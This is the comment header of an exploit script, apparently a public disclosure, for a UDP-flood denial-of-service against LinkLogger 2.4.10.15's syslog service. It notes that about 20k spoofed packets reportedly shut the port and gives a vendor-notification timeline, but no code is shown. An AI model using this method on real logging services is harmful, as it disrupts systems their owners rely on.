# LinkLogger 2.4.10.15 syslog DoS
# Tested against 2.4.10.15
# Coded by Mike Cyr, aka h00die
# mcyr2     at           csc         dot_____________com
# Notes: 1. Based on code from http://www.pythonprasanna.com/Papers%20and%20Articles/Sockets/udpspoof_pl.txt
#        2. The exact amount of packets to overwhelm the program and shut down the port fluctuates, 20k seems to be very successful though
#        3. No joke, this is a great grat product, i love it and highly recommend it.
#	     4. The syslogd module in LinkLogger is from another vendor, attempts to find out which failed.
# Greetz to muts and loganWHD, I tried harder
# http://www.offensive-security.com/offsec101.php turning script kiddies into ninjas daily
# Log: Vendor notification 4/13/09
#      Vendor acknowledgement 4/14/09, the syslogd is actually from another company, vendor contacts syslogd vendor.
#	   Vendor can not run DoS code successfully 5/11/09
#	   Sent instructions and video on how to install all needed modules and run successfully 5/12/09
#	   Asked for update, no response 6/8/09
# 	   Sent to milw0rm and security focus 6/13/09
